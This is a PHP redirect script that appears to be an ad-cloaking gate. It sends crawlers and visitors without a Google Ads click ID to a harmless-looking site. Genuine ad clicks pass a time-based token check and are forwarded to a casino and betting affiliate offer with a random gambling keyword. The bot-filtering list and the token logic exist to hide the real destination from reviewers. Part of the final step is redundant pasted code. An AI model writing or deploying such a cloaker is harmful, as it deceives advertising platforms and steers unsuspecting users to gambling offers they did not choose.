<?php
session_start();

function generatePasswordForTimeSlot($seed, $timestamp, $timeWindow = 300) {
    if ($timeWindow <= 0) {
        $timeWindow = 300; // fallback to 5 mins if invalid
    }
    $timeSlot = floor($timestamp / $timeWindow);
    return substr(hash('sha256', $seed . $timeSlot), 0, 12);
}

function isBotOrCrawler() {
    $botAgents = [
        'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver', 'MJ12bot'
    ];
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $userAgentLower = strtolower($userAgent);

    foreach ($botAgents as $bot) {
        if (stripos($userAgentLower, strtolower($bot)) !== false) {
            return true;
        }
    }
    return false;
}

function isValidParam($param) {
    return isset($param) && strlen(trim($param)) > 5;
}

function isValidGclidOrGbraid($params) {
    return (isValidParam($params['gclid'] ?? null) || isValidParam($params['gbraid'] ?? null));
}

$redirectSafe = "https://glideralive.site";
$params = $_GET;

// Step 1: Bot or invalid traffic redirect (filter known bad bots only)
if (isBotOrCrawler()) {
    // Do not block Googlebot/AdsBot to maintain Ads compliance
    header("Location: $redirectSafe");
    exit;
}

// Step 2: gclid or gbraid missing, redirect safe
if (!isValidGclidOrGbraid($params)) {
    header("Location: $redirectSafe");
    exit;
}

$paramKey = !empty($params['gclid']) ? 'gclid' : 'gbraid';
$paramValue = $params[$paramKey];
$pass = $params['pass'] ?? '';

// Generate passwords for current and previous 5-min windows to allow slight clock skew
$expectedPassCurrent = generatePasswordForTimeSlot($paramValue, time(), 300);
$expectedPassPrev = generatePasswordForTimeSlot($paramValue, time() - 300, 300);

// Step 3: Password check & prevent replay attacks
if ($pass === '') {
    // Password missing - redirect with generated password
    $url = "yes.php?mytoken=" . bin2hex(random_bytes(16)) . "&affid=" . rand(1000, 9999) . "&" .
        "$paramKey=" . urlencode($paramValue) .
        "&pass=$expectedPassCurrent";

    header("Location: $url");
    exit;
}

// Step 4: Reject if password doesn't match current or previous window
if ($pass !== $expectedPassCurrent && $pass !== $expectedPassPrev) {
    header("Location: $redirectSafe");
    exit;
}

// Step 5: Prevent password reuse during session keyed by param type and value
if (!isset($_SESSION['used_passwords'])) {
    $_SESSION['used_passwords'] = [];
}
$sessionKey = $paramKey . '_' . $paramValue . '_' . $pass;

if (in_array($sessionKey, $_SESSION['used_passwords'])) {
    header("Location: $redirectSafe");
    exit;
}
$_SESSION['used_passwords'][] = $sessionKey;

// Step 6: Final redirect to offer page with stable query params
// Example inputs
$pass   = $pass ?? bin2hex(random_bytes(4));
$params = $_GET; // or wherever you're reading gclid/gbraid from

$keywords = [
  'Online casino','Online betting','Casino sites','Betting sites',
  'Casino games','Betting games'
];

// pick one at random
$keyword = $keywords[array_rand($keywords)];

$query = [
  'pass'    => $pass,
  'keyword' => $keyword,
];

if (!empty($params['gclid']))  $query['gclid']  = $params['gclid'];
if (!empty($params['gbraid'])) $query['gbraid'] = $params['gbraid'];

$finalUrl = 'https://go.clicksme.biz/click?pid=3812&offer_id=179&l=1758525538&' . http_build_query($query);

header("Location: $finalUrl");
exit;
?>
